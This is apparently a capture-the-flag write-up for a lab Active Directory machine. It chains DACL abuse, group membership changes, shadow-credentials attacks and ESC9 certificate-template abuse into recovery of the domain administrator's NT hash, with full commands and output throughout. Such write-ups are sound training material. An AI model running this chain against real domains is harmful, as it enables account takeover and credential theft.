First get some information with `enum4linux`.

```
enum4linux-ng -A "$TARGET" -u "$USER" -p "$PASSWORD"
```

Nothing, let's move on.

Judith have with `Owns / Write Member` on Management I can grant permission such as `WriteMembers`.

```bash
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'JUDITH.MADER' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' "$DOMAIN"/"$USER":"$PASSWORD"
[*] DACL backed up to dacledit-20241221-194223.bak
[*] DACL modified successfully!
```

I can then add judith to management.

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember $TargetGroup $TargetUser
[+] judith.mader added to Management
```

Then, `Management` have `GenericWrite` over `Management_svc`. I can edit `msDS-KeyCredentialLink` where raw public keys can be set.

```bash
pywhisker.py -d $DOMAIN -u $USER -p $PASSWORD --target 'MANAGEMENT_SVC' --action "add"
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 640a8a6f-755d-bd2a-f436-7bc5415bc967
[*] Updating the msDS-KeyCredentialLink attribute of MANAGEMENT_SVC
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: rCEvgXXN.pfx
[*] Must be used with password: olqnQEPOPhV3kn2jHoGR
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Then pass the certificate in order to obtain a TGT.

```bash
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
2024-12-22 02:49:57,837 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-12-22 02:49:57,941 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-12-22 02:49:58,011 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-12-22 02:49:58,012 minikerberos INFO     bb9f7c3c55592b8eafe07e8ed27a812add9c96066dc1ea8805e65b002da8d036
INFO:minikerberos:bb9f7c3c55592b8eafe07e8ed27a812add9c96066dc1ea8805e65b002da8d036
2024-12-22 02:49:58,028 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Extract sessions keys from this tgt. Thus getting the nt hash.

```bash
export KRB5CCNAME=tgt.cache
getnthash.py -key bb9f7c3c55592b8eafe07e8ed27a812add9c96066dc1ea8805e65b002da8d036 "$DOMAIN"/management_svc
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

We can connect as management_svc with the hash and get user flag.

`Management_svc` as `GenericAll` over `ca_operator` meaning it can change his password.

```bash
pth-net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
```

Don't manage to get it working, let's do Shadow Credentials again.

This time with `certipy` as it automate the privesc.

```bash
certipy shadow auto -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator
[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7f0f265d-8d79-89cc-c600-52406f08aa5e'
[*] Adding Key Credential with device ID '7f0f265d-8d79-89cc-c600-52406f08aa5e' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '7f0f265d-8d79-89cc-c600-52406f08aa5e' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

Now we run certipy to see if there is vuln in some pre created certs


```bash
certipy find -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip "$DC_IP" -vulnerable -stdout
# Got nothing
```

Don't forget to change the username !!!

```bash
certipy find -username 'ca_operator' -hashes 58a478135a93ac3bf058a5ea0e8fdb71 -dc-ip "$DC_IP" -target certified.htb -enabled -vulnerable -stdout
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

First we need to change the UPN

```bash
certipy account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn 'Administrator'
[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

Then we request the certificate

```bash
certipy req -username 'ca_operator@certified.htb' -hashes 58a478135a93ac3bf058a5ea0e8fdb71 -ca certified-DC01-CA -template "CertifiedAuthentication" -target "$DC_IP"
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Change the UPN to something else, why ?

```bash
certipy account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn 'ca_operator'
```

get hash !

```bash
certipy auth -pfx 'administrator.pfx' -domain "$DOMAIN"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```
